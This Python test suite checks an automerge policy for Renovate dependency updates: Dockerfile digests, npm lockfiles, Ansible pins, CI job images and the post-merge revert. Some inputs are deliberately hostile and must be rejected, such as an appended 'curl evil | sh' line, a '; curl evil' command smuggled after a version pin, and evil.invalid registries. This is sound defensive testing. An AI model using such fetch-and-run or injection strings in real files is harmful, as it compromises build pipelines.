"""Tests for the dependency class (docs/AUTOMERGE.md, "Dependency updates"):
Dockerfile base images and version pins, the OpenClaw tool npm dependencies,
annotated ansible version pins, security-critical images and CI jobs, the
sweep's build-check gate, the merge, the post-merge watch and revert, and the
real policy, renovate.json, CODEOWNERS and CI file.

Run: python3 -m unittest discover -s ci/automerge -v
"""

import copy
import json
import re
import subprocess
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import automerge  # noqa: E402
import policy  # noqa: E402
from policy import FileChange  # noqa: E402

REPO = Path(__file__).resolve().parents[2]
ALLOW = automerge.load_allowlist()
CFG = policy.dependencies_config(ALLOW)
RENOVATE = CFG["authors"][0]
CODEOWNERS = (REPO / "CODEOWNERS").read_text()
CI_TEXT = (REPO / policy.CI_PATH).read_text()
D1 = "sha256:" + "1" * 64
D2 = "sha256:" + "2" * 64
H1, H2 = "a" * 64, "b" * 64

NOVNC = "docker/novnc/Dockerfile"
JIT = "docker/jit-approval-svc/Dockerfile"
OPENCLAW = "docker/openclaw/Dockerfile"
PKG = CFG["npm"]["package_json"]
LOCK = CFG["npm"]["lockfile"]
TASKS = "ansible/roles/configure-homelab-services/tasks/main.yml"
DEFAULTS = "ansible/roles/configure-excel-vm/defaults/main.yml"

DOCKERFILE = f"""# syntax=docker/dockerfile:1
FROM golang:1.27.2-alpine@{D1} AS builder
WORKDIR /app
RUN echo build \\
    && echo FROM nothing:1.0@{D1}
RUN <<EOF
FROM heredoc:1.0@{D1}
EOF

FROM python:3.12.14-slim@{D1}
# renovate: datasource=github-releases depName=foo/bar
ARG BAR_VERSION=1.4.2
RUN npm install -g @anthropic-ai/claude-code@2.1.318
CMD ["run"]
"""


def evaluate(files, author=RENOVATE, labels=(), codeowners=CODEOWNERS, allow=ALLOW, ci_text=CI_TEXT):
    """files: {path: (base, head)}"""
    return policy.evaluate_mr(author=author, target_branch="main", labels=list(labels),
                              files=[FileChange(path=p) for p in files], composes=dict(files),
                              allowlist=allow, codeowners_text=codeowners, merger="automerge-bot",
                              ci_text=ci_text)


def edit(text, old, new, count=1):
    assert old in text, old
    return text.replace(old, new, count)


class DockerfileTests(unittest.TestCase):
    def ok(self, head, path=NOVNC, base=DOCKERFILE):
        v = evaluate({path: (base, head)})
        self.assertTrue(v.eligible, v.reasons)
        self.assertTrue(v.dependency)
        return v

    def no(self, head, path=NOVNC, base=DOCKERFILE, why=None):
        v = evaluate({path: (base, head)})
        self.assertFalse(v.eligible)
        if why:
            self.assertTrue(any(why in r for r in v.reasons), v.reasons)
        return v

    def test_digest_only(self):
        v = self.ok(edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D2}"))
        self.assertEqual([(c.kind, c.name) for c in v.dep_changes], [("digest", "python")])
        self.assertEqual(v.required_jobs, ["novnc:build-check"])
        self.assertEqual(v.hold_keys, [(policy.DEP_HOLD_JOB, "python")])

    def test_patch_and_minor(self):
        self.ok(edit(DOCKERFILE, f"golang:1.27.2-alpine@{D1}", f"golang:1.27.3-alpine@{D2}"))
        v = self.ok(edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.15.2-slim@{D2}"))
        self.assertEqual(v.dep_changes[0].kind, "minor")

    def test_major_and_flavor(self):
        v = self.no(edit(DOCKERFILE, f"golang:1.27.2-alpine@{D1}", f"golang:2.0.0-alpine@{D2}"), why="major")
        self.assertTrue(v.major)
        self.no(edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim-trixie@{D2}"), why="flavor")
        self.no(edit(DOCKERFILE, f"golang:1.27.2-alpine@{D1}", f"golang:1.27.3-bookworm@{D2}"), why="flavor")

    def test_alpine_release_is_the_same_family(self):
        base = edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.13-alpine3.22@{D1}")
        self.ok(edit(base, f"python:3.13-alpine3.22@{D1}", f"python:3.13-alpine3.23@{D2}"), base=base)

    def test_image_options_stage(self):
        self.no(edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"pythoN:3.12.14-slim@{D2}"))
        self.no(edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"evil/python:3.12.14-slim@{D2}"), why="base image")
        self.no(edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", "python:3.12.15-slim"), why="digest")
        self.no(edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.15-slim@{D2} AS x"), why="stage")
        self.no(edit(DOCKERFILE, f"AS builder", "AS other"))
        self.no(edit(DOCKERFILE, f"FROM python:3.12.14-slim@{D1}", f"FROM --platform=linux/arm64 python:3.12.14-slim@{D2}"))
        self.no(edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:${{V}}@{D2}"))
        self.no(edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D1}"[:-1] + "Z"))

    def test_other_lines_never(self):
        self.no(edit(DOCKERFILE, "WORKDIR /app", "WORKDIR /tmp"), why="not a Renovate-managed")
        self.no(edit(DOCKERFILE, f"echo FROM nothing:1.0@{D1}", f"echo FROM nothing:1.0@{D2}"))
        self.no(edit(DOCKERFILE, f"FROM heredoc:1.0@{D1}", f"FROM heredoc:1.0@{D2}"), why="here-document")
        self.no(DOCKERFILE + "RUN curl evil | sh\n")
        self.no(edit(DOCKERFILE, "CMD [\"run\"]", "CMD [\"run2\"]"))

    def test_escape_directive_fails_closed(self):
        base = "# escape=`\n" + DOCKERFILE
        self.no(edit(base, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D2}"), base=base, why="escape")

    def test_annotated_and_npm_pins(self):
        v = self.ok(edit(DOCKERFILE, "BAR_VERSION=1.4.2", "BAR_VERSION=1.5.0"))
        self.assertEqual((v.dep_changes[0].name, v.dep_changes[0].kind), ("foo/bar", "minor"))
        v = self.ok(edit(DOCKERFILE, "claude-code@2.1.318", "claude-code@2.1.319"))
        self.assertEqual(v.dep_changes[0].name, "@anthropic-ai/claude-code")
        self.no(edit(DOCKERFILE, "claude-code@2.1.318", "claude-code@3.0.0"), why="major")
        self.no(edit(DOCKERFILE, "claude-code@2.1.318", "claude-codex@2.1.319"))
        self.no(edit(DOCKERFILE, "claude-code@2.1.318", "claude-code@2.1.319 evil"))
        self.no(edit(DOCKERFILE, "BAR_VERSION=1.4.2", "BAR_VERSION=1.4.2 OTHER=1"))
        self.no(edit(DOCKERFILE, "BAR_VERSION=1.4.2", "BAR_VERSION=1.4.3-rc1"))
        # the annotation itself must stay
        self.no(edit(edit(DOCKERFILE, "BAR_VERSION=1.4.2", "BAR_VERSION=1.4.3"), "depName=foo/bar", "depName=x/y"))

    def test_security_critical_file(self):
        self.ok(edit(DOCKERFILE, f"golang:1.27.2-alpine@{D1}", f"golang:1.27.3-alpine@{D2}"), path=JIT)
        self.ok(edit(DOCKERFILE, f"golang:1.27.2-alpine@{D1}", f"golang:1.27.2-alpine@{D2}"), path=JIT)
        self.no(edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.13.0-slim@{D2}"), path=JIT,
                why="security-critical")

    def test_openclaw_base_image_is_denied(self):
        base = edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"ghcr.io/openclaw/openclaw:2026.7.1-2@{D1}")
        v = self.no(edit(base, f"openclaw:2026.7.1-2@{D1}", f"openclaw:2026.7.1-2@{D2}"), path=OPENCLAW, base=base,
                    why=policy.DENIED_MARK)
        self.assertTrue(v.denied)

    def test_needs_a_build_check_job(self):
        head = edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D2}")
        v = evaluate({NOVNC: (DOCKERFILE, head)}, ci_text=CI_TEXT.replace("novnc:build-check:", "novnc:other:"))
        self.assertFalse(v.eligible)
        self.assertTrue(any("build-check" in r for r in v.reasons), v.reasons)
        self.assertFalse(evaluate({NOVNC: (DOCKERFILE, head)}, ci_text=None).eligible)

    def test_whole_mr_gates(self):
        head = edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D2}")
        ci = CI_TEXT
        ci_head = ci.replace("gcr.io/kaniko-project/executor:v1.23.2-debug", "gcr.io/kaniko-project/executor:v1.23.2-debug@" + D2)
        for author in ("moltbot", "root", "automerge-bot"):
            self.assertFalse(evaluate({NOVNC: (DOCKERFILE, head)}, author=author).eligible, author)
        for label in ("freeze", "major"):
            self.assertFalse(evaluate({NOVNC: (DOCKERFILE, head)}, labels=[label]).eligible, label)
        v = evaluate({NOVNC: (DOCKERFILE, head), policy.CI_PATH: (ci, ci_head)})
        self.assertFalse(v.eligible)
        self.assertTrue(any("must not change other files" in r for r in v.reasons), v.reasons)
        self.assertFalse(evaluate({NOVNC: (DOCKERFILE, head), "README.md": ("a", "b")}).eligible)
        # a new Dockerfile is not an update
        v = policy.evaluate_mr(author=RENOVATE, target_branch="main", labels=[],
                               files=[FileChange(path=NOVNC, new_file=True)], composes={NOVNC: (DOCKERFILE, head)},
                               allowlist=ALLOW, codeowners_text=CODEOWNERS, ci_text=CI_TEXT)
        self.assertFalse(v.eligible)

    def test_codeowner_required(self):
        head = edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D2}")
        owners = CODEOWNERS + "\n/docker/novnc/Dockerfile @root\n"
        v = evaluate({NOVNC: (DOCKERFILE, head)}, codeowners=owners)
        self.assertFalse(v.eligible)
        self.assertTrue(any("CODEOWNERS" in r for r in v.reasons), v.reasons)

    def test_disabled_or_malformed_fails_closed(self):
        allow = copy.deepcopy(ALLOW)
        allow["dependencies"]["enabled"] = False
        head = edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D2}")
        self.assertFalse(evaluate({NOVNC: (DOCKERFILE, head)}, allow=allow).eligible)
        allow = copy.deepcopy(ALLOW)
        allow["dependencies"]["denylist"] = {"x": ""}
        self.assertFalse(evaluate({NOVNC: (DOCKERFILE, head)}, allow=allow).eligible)

    def test_paths(self):
        for p in ("docker/novnc/Dockerfile", "docker/images/nginx/Dockerfile"):
            self.assertEqual(policy.dependency_file_kind(p, CFG), "dockerfile")
        for p in ("docker/novnc/../novnc/Dockerfile", "./docker/novnc/Dockerfile", "docker//novnc/Dockerfile",
                  "docker/a/b/Dockerfile", "docker/novnc/Dockerfile.dev", "docker/novnc/dockerfile",
                  "/docker/novnc/Dockerfile", "ansible/roles/x/handlers/main.yml", "ansible/roles/x/tasks/a/b.yml"):
            self.assertIsNone(policy.dependency_file_kind(p, CFG), p)


TASKS_TEXT = """- name: Install gitleaks binary
  ansible.builtin.shell: |
    set -euo pipefail
    # renovate: datasource=docker depName=zricethezav/gitleaks
    GITLEAKS_VERSION="8.30.0"
    DEST="/usr/local/bin/gitleaks"
    curl -o x "https://example.invalid/v${GITLEAKS_VERSION}.tgz"

- name: Something else
  ansible.builtin.command: echo 1.2.3
"""

DEFAULTS_TEXT = f"""# renovate: datasource=custom.virtio-win depName=virtio-win
excel_vm_virtio_release: "0.1.302-1"
excel_vm_virtio_iso:
  url: "https://example.invalid/{{{{ excel_vm_virtio_release }}}}.iso"
  sha256: {H1}

other: 1
"""


class PinFileTests(unittest.TestCase):
    def test_annotated_version(self):
        v = evaluate({TASKS: (TASKS_TEXT, edit(TASKS_TEXT, '"8.30.0"', '"8.30.1"'))})
        self.assertTrue(v.eligible, v.reasons)
        self.assertEqual(v.required_jobs, [])
        self.assertEqual(v.dep_names, ["zricethezav/gitleaks"])

    def test_not_a_pin(self):
        v = evaluate({TASKS: (TASKS_TEXT, edit(TASKS_TEXT, "echo 1.2.3", "echo 1.2.4"))})
        self.assertFalse(v.eligible)
        v = evaluate({TASKS: (TASKS_TEXT, edit(TASKS_TEXT, '"8.30.0"', '"8.30.0" ; curl evil'))})
        self.assertFalse(v.eligible)
        v = evaluate({TASKS: (TASKS_TEXT, edit(TASKS_TEXT, '"8.30.0"', '"{{ x }}"'))})
        self.assertFalse(v.eligible)
        v = evaluate({TASKS: (TASKS_TEXT, edit(TASKS_TEXT, '"8.30.0"', '"9.0.0"'))})
        self.assertFalse(v.eligible)
        self.assertTrue(v.major)

    def test_checksum_must_follow_the_version(self):
        head = edit(DEFAULTS_TEXT, "0.1.302-1", "0.1.303-1")
        v = evaluate({DEFAULTS: (DEFAULTS_TEXT, head)})
        self.assertFalse(v.eligible)
        self.assertTrue(any("checksum" in r for r in v.reasons), v.reasons)
        v = evaluate({DEFAULTS: (DEFAULTS_TEXT, edit(head, H1, H2))})
        self.assertTrue(v.eligible, v.reasons)
        self.assertEqual(sorted(c.kind for c in v.dep_changes), ["checksum", "patch"])
        # 0.x minor: a major unless listed
        minor = edit(edit(DEFAULTS_TEXT, "0.1.302-1", "0.2.0-1"), H1, H2)
        v = evaluate({DEFAULTS: (DEFAULTS_TEXT, minor)})
        self.assertFalse(v.eligible)
        self.assertTrue(v.major)
        allow = copy.deepcopy(ALLOW)
        allow["dependencies"]["zero_minor_is_minor"] = ["virtio-win"]
        v = evaluate({DEFAULTS: (DEFAULTS_TEXT, minor)}, allow=allow)
        self.assertTrue(v.eligible, v.reasons)
        self.assertEqual(sorted(c.kind for c in v.dep_changes), ["checksum", "minor"])
        # a checksum alone, or something else next to the pin, never
        self.assertFalse(evaluate({DEFAULTS: (DEFAULTS_TEXT, edit(DEFAULTS_TEXT, H1, H2))}, allow=allow).eligible)
        evil = edit(edit(head, H1, H2), "example.invalid", "evil.invalid")
        self.assertFalse(evaluate({DEFAULTS: (DEFAULTS_TEXT, evil)}, allow=allow).eligible)


PKG_TEXT = json.dumps({"name": "openclaw-image-tools", "private": True,
                       "dependencies": {"agent-browser": "0.35.1", "playwright": "1.62.1"}}, indent=2) + "\n"


def lockfile(versions, extra=None, resolved="https://registry.npmjs.org/", integrity="sha512-AAAA"):
    pk = {"": {"name": "openclaw-image-tools", "dependencies": dict(versions)}}
    for name, ver in versions.items():
        pk["node_modules/" + name] = {"version": ver, "resolved": f"{resolved}{name}/-/{name}-{ver}.tgz",
                                      "integrity": integrity}
    for name, entry in (extra or {}).items():
        pk["node_modules/" + name] = entry
    return json.dumps({"name": "openclaw-image-tools", "lockfileVersion": 3, "requires": True,
                       "packages": pk}, indent=2) + "\n"


class NpmTests(unittest.TestCase):
    OLD = {"agent-browser": "0.35.1", "playwright": "1.62.1"}

    def pair(self, **new):
        vers = {**self.OLD, **new}
        head = PKG_TEXT
        for k, v in new.items():
            head = head.replace(f'"{k}": "{self.OLD[k]}"', f'"{k}": "{v}"')
        return head, vers

    def test_patch_minor_with_lockfile(self):
        head, vers = self.pair(playwright="1.63.0")
        lock = lockfile(vers, extra={"playwright-core": {"version": "1.63.0", "resolved":
                                     "https://registry.npmjs.org/playwright-core/-/x.tgz", "integrity": "sha512-B"}})
        v = evaluate({PKG: (PKG_TEXT, head), LOCK: (lockfile(self.OLD), lock)})
        self.assertTrue(v.eligible, v.reasons)
        self.assertEqual(v.required_jobs, ["openclaw:build-check"])
        self.assertEqual(v.dep_names, ["playwright"])

    def test_lockfile_must_match_and_come_along(self):
        head, vers = self.pair(playwright="1.63.0")
        self.assertFalse(evaluate({PKG: (PKG_TEXT, head)}).eligible)
        self.assertFalse(evaluate({PKG: (PKG_TEXT, head), LOCK: (lockfile(self.OLD), lockfile(self.OLD))}).eligible)
        self.assertFalse(evaluate({LOCK: (lockfile(self.OLD), lockfile(vers))}).eligible)
        stale = lockfile(vers).replace('"version": "1.63.0"', '"version": "1.62.1"')
        self.assertFalse(evaluate({PKG: (PKG_TEXT, head), LOCK: (lockfile(self.OLD), stale)}).eligible)

    def test_lockfile_registry_and_integrity(self):
        head, vers = self.pair(playwright="1.63.0")
        for lock in (lockfile(vers, resolved="https://evil.invalid/"), lockfile(vers, integrity="sha1-AAAA"),
                     lockfile(vers, extra={"x": {"version": "1.0.0", "link": True, "resolved": "../x"}}),
                     lockfile(vers, extra={"x": {"version": "1.0.0", "resolved": "git+ssh://x"}})):
            self.assertFalse(evaluate({PKG: (PKG_TEXT, head), LOCK: (lockfile(self.OLD), lock)}).eligible)

    def test_package_json_shape(self):
        lock_old = lockfile(self.OLD)
        head, vers = self.pair(playwright="2.0.0")
        v = evaluate({PKG: (PKG_TEXT, head), LOCK: (lock_old, lockfile(vers))})
        self.assertFalse(v.eligible)
        self.assertTrue(v.major)
        head, vers = self.pair(**{"agent-browser": "0.41.2"})
        self.assertFalse(evaluate({PKG: (PKG_TEXT, head), LOCK: (lock_old, lockfile(vers))}).eligible)
        for bad in (PKG_TEXT.replace('"playwright": "1.62.1"', '"playwright": "^1.63.0"'),
                    PKG_TEXT.replace('"playwright": "1.62.1"', '"playwright": "1.63.0", "evil": "1.0.0"'),
                    PKG_TEXT.replace('"private": true', '"private": true, "scripts": {"x": "y"}'),
                    PKG_TEXT.replace('"name"', '"name": "x", "name"'),
                    PKG_TEXT.replace('"playwright": "1.62.1"', '"playwright": "git+https://x/y.git"')):
            self.assertFalse(evaluate({PKG: (PKG_TEXT, bad), LOCK: (lock_old, lockfile(self.OLD))}).eligible, bad)

    def test_zero_minor_opt_in(self):
        allow = copy.deepcopy(ALLOW)
        allow["dependencies"]["zero_minor_is_minor"] = ["agent-browser"]
        head, vers = self.pair(**{"agent-browser": "0.41.2"})
        v = evaluate({PKG: (PKG_TEXT, head), LOCK: (lockfile(self.OLD), lockfile(vers))}, allow=allow)
        self.assertTrue(v.eligible, v.reasons)


class CriticalCiJobTests(unittest.TestCase):
    BASE = f"""vault:configure:
  image: alpine:3.19@{D1}
  script:
    - x

lint:
  image: alpine:3.19@{D1}
  script:
    - x
"""

    def test_vault_jobs_take_patch_and_digest_only(self):
        def ev(head):
            return evaluate({policy.CI_PATH: (self.BASE, head)})
        self.assertFalse(ev(self.BASE.replace(f"alpine:3.19@{D1}", f"alpine:3.24@{D2}", 1)).eligible)
        self.assertTrue(ev(self.BASE.replace(f"alpine:3.19@{D1}", f"alpine:3.19.1@{D2}", 1)).eligible)
        self.assertTrue(ev(self.BASE.replace(f"alpine:3.19@{D1}", f"alpine:3.19@{D2}", 1)).eligible)
        other = self.BASE.split("lint:")
        self.assertTrue(ev(other[0] + "lint:" + other[1].replace(f"alpine:3.19@{D1}", f"alpine:3.24@{D2}")).eligible)


class FakeGitLab:
    def __init__(self, jobs=None, files=None, dry_run=False):
        self.jobs = jobs or []
        self.files = files or {}
        self.writes = []
        self.dry_run = dry_run

    def get_all(self, path, **params):
        if path.endswith("/jobs"):
            return self.jobs
        return []

    def get(self, path, **params):
        if path.endswith("/merge_requests"):
            return []
        if "/repository/branches/" in path:
            raise RuntimeError("HTTP 404")
        return {}

    def write(self, method, path, body=None):
        self.writes.append((method, path, body))
        return {"iid": 77}

    def file_at(self, path, ref):
        return self.files.get((path, ref))

    def ensure_labels(self):
        pass


class SweepTests(unittest.TestCase):
    def verdict(self):
        head = edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D2}")
        v = evaluate({NOVNC: (DOCKERFILE, head)})
        self.assertTrue(v.eligible, v.reasons)
        return v

    def test_required_jobs(self):
        v = self.verdict()
        mr = {"sha": "abc", "head_pipeline": {"id": 5, "sha": "abc", "status": "success"}}
        jobs = [{"id": 1, "name": "novnc:build-check", "status": "failed"},
                {"id": 2, "name": "novnc:build-check", "status": "success"}]
        self.assertEqual(automerge.required_job_blockers(FakeGitLab(jobs), mr, v), [])
        for jobs in ([], [{"id": 1, "name": "novnc:build-check", "status": "manual"}],
                     [{"id": 3, "name": "novnc:build-check", "status": "success"},
                      {"id": 4, "name": "novnc:build-check", "status": "failed"}]):
            self.assertTrue(automerge.required_job_blockers(FakeGitLab(jobs), mr, v), jobs)
        stale = {"sha": "abc", "head_pipeline": {"id": 5, "sha": "old", "status": "success"}}
        self.assertTrue(automerge.required_job_blockers(FakeGitLab(), stale, v))

    def test_merge_trailers_and_labels(self):
        v = self.verdict()
        gl = FakeGitLab()
        mr = {"iid": 1159, "sha": "f" * 40, "source_branch": "renovate/x", "target_branch": "main",
              "title": "t", "detailed_merge_status": "not_approved"}
        self.assertTrue(automerge.do_merge(gl, mr, v))
        merge = next(b for m, p, b in gl.writes if p.endswith("/merge"))
        self.assertIn(automerge.DEP_TRAILER, merge["merge_commit_message"])
        self.assertNotIn("Automerge-Deploy", merge["merge_commit_message"])
        labels = next(b for m, p, b in gl.writes if b and "add_labels" in b)["add_labels"].split(",")
        self.assertEqual(sorted(labels), sorted([automerge.LABEL_MERGED, automerge.LABEL_DEPENDENCY,
                                                 automerge.LABEL_DEP_WATCH]))

    def test_dependency_merges_deploy_normally(self):
        # .automerged_commit_manual must not match the dependency trailer: the
        # image builds and host deploys run as for a reviewed merge.
        m = re.search(r"\.automerged_commit_manual:\n  rules:\n    - if: '.*?=~ /(Automerge-Policy: [^/]*)/'", CI_TEXT)
        self.assertTrue(m)
        self.assertFalse(re.search(m.group(1), automerge.DEP_TRAILER + "\n" + automerge.DEP_CLASS_TRAILER))
        for line in CI_TEXT.split("\n"):
            if "CI_COMMIT_MESSAGE" in line:
                self.assertNotIn("dependency", line)

    def test_rollback_gate(self):
        v = self.verdict()
        issue = {"iid": 3, "description": "<!-- automerge-rollback job=dep services=python -->"}
        self.assertTrue(automerge.rollback_gate([(issue, automerge.rollback_scope(issue))], v))
        issue = {"iid": 3, "description": "<!-- automerge-rollback job=ci services=python -->"}
        self.assertIsNone(automerge.rollback_gate([(issue, automerge.rollback_scope(issue))], v))

    def test_watch_jobs(self):
        jobs = [{"name": n} for n in ("novnc:build", "router:deploy", "zwave:deploy", "nginx:build",
                                      "router:deploy-service", "revert-guard")]
        self.assertEqual(automerge.dep_watch_jobs(["novnc:build-check"], jobs),
                         ["novnc:build", "router:deploy", "zwave:deploy"])

    def test_revert_text(self):
        head = edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D2}")
        r = policy.dependency_changes([NOVNC], {NOVNC: (DOCKERFILE, head)}, ALLOW, CI_TEXT)
        self.assertEqual(automerge.revert_file_text(head, DOCKERFILE, head, r.changes), DOCKERFILE)
        moved = head.replace("WORKDIR /app", "WORKDIR /srv")
        self.assertEqual(automerge.revert_file_text(moved, DOCKERFILE, head, r.changes),
                         DOCKERFILE.replace("WORKDIR /app", "WORKDIR /srv"))
        gone = head.replace(f"python:3.12.14-slim@{D2}", f"python:3.12.15-slim@{D1}")
        self.assertIsNone(automerge.revert_file_text(gone, DOCKERFILE, head, r.changes))

    def test_rollback_opens_revert_and_issue(self):
        head = edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D2}")
        r = policy.dependency_changes([NOVNC], {NOVNC: (DOCKERFILE, head)}, ALLOW, CI_TEXT)
        dep = {"paths": [NOVNC], "contents": {NOVNC: (DOCKERFILE, head)}, "names": r.names,
               "required_jobs": r.required_jobs, "changes": r.changes}
        gl = FakeGitLab(files={(NOVNC, "main"): head}, dry_run=True)
        automerge.dep_rollback(gl, {"iid": 1159, "title": "t", "merge_commit_sha": "m"}, dep, ["novnc:build"], "u")
        commit = next(b for m, p, b in gl.writes if p.endswith("/repository/commits"))
        self.assertEqual(commit["actions"][0]["content"], DOCKERFILE)
        issue = next(b for m, p, b in gl.writes if p.endswith("/issues"))
        self.assertIn("job=dep services=python", issue["description"])


class WatchGitLab(FakeGitLab):
    """Answers the reads of ci_watch for one merged dependency MR."""

    def __init__(self, base, head, status, jobs):
        super().__init__(jobs=jobs, files={(NOVNC, "base"): base, (NOVNC, "merge"): head, (NOVNC, "main"): head,
                                           (policy.CI_PATH, "merge"): CI_TEXT})
        self.status = status
        self.mr = {"iid": 1159, "title": "novnc", "merge_commit_sha": "merge", "web_url": "u"}

    def get_all(self, path, **params):
        if path.endswith("/merge_requests"):
            return [self.mr] if params.get("labels") == automerge.LABEL_DEP_WATCH else []
        return super().get_all(path, **params)

    def get(self, path, **params):
        if path.endswith("/pipelines"):
            return [{"id": 9, "status": self.status, "web_url": "p"}]
        if "/repository/commits/" in path:
            return {"parent_ids": ["base"]}
        if path.endswith("/repository/compare"):
            return {"diffs": [{"new_path": NOVNC, "old_path": NOVNC}]}
        return super().get(path, **params)


class WatchFlowTests(unittest.TestCase):
    def setUp(self):
        self.head = edit(DOCKERFILE, f"python:3.12.14-slim@{D1}", f"python:3.12.14-slim@{D2}")
        self._mail = automerge.mail_root
        automerge.mail_root = lambda s, b: True

    def tearDown(self):
        automerge.mail_root = self._mail

    def run_watch(self, status, jobs):
        gl = WatchGitLab(DOCKERFILE, self.head, status, jobs)
        return gl, automerge.ci_watch(gl, ALLOW)

    def test_pending(self):
        gl, pending = self.run_watch("running", [])
        self.assertEqual(pending, [1159])
        self.assertEqual(gl.writes, [])

    def test_passed(self):
        gl, pending = self.run_watch("success", [{"name": "novnc:build", "status": "success"}])
        self.assertEqual(pending, [])
        self.assertIn(("PUT", "projects/4/merge_requests/1159", {"remove_labels": automerge.LABEL_DEP_WATCH}),
                      gl.writes)
        self.assertFalse(any(p.endswith("/issues") for _, p, _ in gl.writes))

    def test_build_failure_reverts_and_holds(self):
        gl, _ = self.run_watch("failed", [{"name": "novnc:build", "status": "failed"}])
        commit = next(b for m, p, b in gl.writes if p.endswith("/repository/commits"))
        self.assertEqual(commit["actions"], [{"action": "update", "file_path": NOVNC, "content": DOCKERFILE}])
        issue = next(b for m, p, b in gl.writes if p.endswith("/issues"))
        self.assertEqual(automerge.rollback_scope(issue), {(policy.DEP_HOLD_JOB, "python")})

    def test_unrelated_failure_is_noted(self):
        gl, _ = self.run_watch("failed", [{"name": "netgear:test", "status": "failed"}])
        self.assertFalse(any(p.endswith("/issues") for _, p, _ in gl.writes))
        self.assertTrue(any(b and "Not reverted" in b.get("body", "") for _, _, b in gl.writes))


class RealRepoTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        out = subprocess.run(["git", "-c", "safe.directory=*", "-C", str(REPO), "ls-files", "-z"],
                             check=True, capture_output=True, text=True).stdout
        cls.files = [f for f in out.split("\0") if f]
        cls.rules = json.loads((REPO / "renovate.json").read_text())["packageRules"]

    def covered(self):
        for p in self.files:
            kind = policy.dependency_file_kind(p, CFG)
            if kind == "pins" and not any(policy._ANNOTATION.match(l)
                                          for l in (REPO / p).read_text().split("\n")):
                continue
            if kind:
                yield p, kind

    def test_config(self):
        self.assertTrue(CFG["enabled"])
        self.assertEqual(CFG["authors"], ALLOW["ci_images"]["authors"])
        self.assertIn(JIT, CFG["critical_files"])
        self.assertIn("docker/event-router/Dockerfile", CFG["critical_files"])
        self.assertIn("ghcr.io/openclaw/openclaw", CFG["denylist"])
        for f in CFG["critical_files"]:
            self.assertEqual(policy.dependency_file_kind(f, CFG), "dockerfile", f)
            self.assertTrue((REPO / f).exists(), f)

    def test_every_covered_file_lists_the_bot(self):
        for p, _ in self.covered():
            own = policy.codeowner_of(p, CODEOWNERS)
            self.assertIn("@root", own, p)
            self.assertIn(CFG["codeowner"], own, p)

    def test_every_dockerfile_has_a_build_check(self):
        jobs = policy.build_check_jobs(CI_TEXT)
        for p, kind in self.covered():
            if kind != "pins":
                self.assertTrue(any(p.startswith(c + "/") for c in jobs), p)
        self.assertEqual(jobs["docker/novnc"], "novnc:build-check")

    def test_real_dockerfiles_parse(self):
        for p, kind in self.covered():
            if kind == "dockerfile":
                text = (REPO / p).read_text()
                self.assertEqual(policy.dockerfile_structure(text), policy.dockerfile_structure(text))

    def test_replay_on_real_files(self):
        # !1159 (novnc digest), !1151 (claude-code), !1153 (gitleaks)
        for path, old_re in ((NOVNC, r"(FROM \S+@sha256:)([0-9a-f]{64})"),
                             (OPENCLAW, r"(claude-code@\d+\.\d+\.)(\d+)"),
                             (TASKS, r'(GITLEAKS_VERSION="\d+\.\d+\.)(\d+)')):
            text = (REPO / path).read_text()
            m = re.search(old_re, text)
            self.assertTrue(m, path)
            new = H2 if len(m.group(2)) == 64 else str(int(m.group(2)) + 1)
            head = text[:m.start(2)] + new + text[m.end(2):]
            v = evaluate({path: (text, head)})
            self.assertTrue(v.eligible, (path, v.reasons))

    def test_renovate_rules_match_policy(self):
        def rule(prefix):
            found = [r for r in self.rules if r.get("description", "").startswith(prefix)]
            self.assertEqual(len(found), 1, prefix)
            return found[0]
        crit = sorted(CFG["critical_files"])
        self.assertEqual(sorted(rule("Dependency class, security-critical images (")["matchFileNames"]), crit)
        manual = rule("Dependency class, security-critical images: a minor")
        self.assertEqual(sorted(manual["matchFileNames"]), crit)
        self.assertEqual(manual["matchUpdateTypes"], ["minor"])
        self.assertIn("automerge-manual", manual["addLabels"])
        cls = rule("Dependency class (docs/AUTOMERGE.md, \"Dependency updates\"): non-major")
        self.assertEqual(cls["matchPackageNames"][0], "/.+/")
        excluded = {n[1:] for n in cls["matchPackageNames"][1:]}
        self.assertEqual(excluded, set(policy.denylist(ALLOW)["images"]) | set(CFG["denylist"]))
        self.assertNotIn("major", cls["matchUpdateTypes"])
        self.assertNotIn("automerge", cls)
        globs = set(cls["matchFileNames"])
        self.assertEqual(globs, set(CFG["dockerfiles"]) | set(CFG["pin_files"]) | {CFG["npm"]["package_json"]})
        deny = rule("Dependency class denylist")
        self.assertEqual(sorted(deny["matchPackageNames"]), sorted(CFG["denylist"]))
        split = rule("Dependency class (docs/AUTOMERGE.md, \"Dependency updates\"): .gitlab-ci.yml job image")
        self.assertEqual(split["matchManagers"], ["gitlabci"])
        self.assertTrue(split["additionalBranchPrefix"])

    def test_renovate_pins_ci_digests(self):
        cfg = json.loads((REPO / "renovate.json").read_text())
        self.assertTrue(cfg["gitlabci"]["pinDigests"])


if __name__ == "__main__":
    unittest.main()
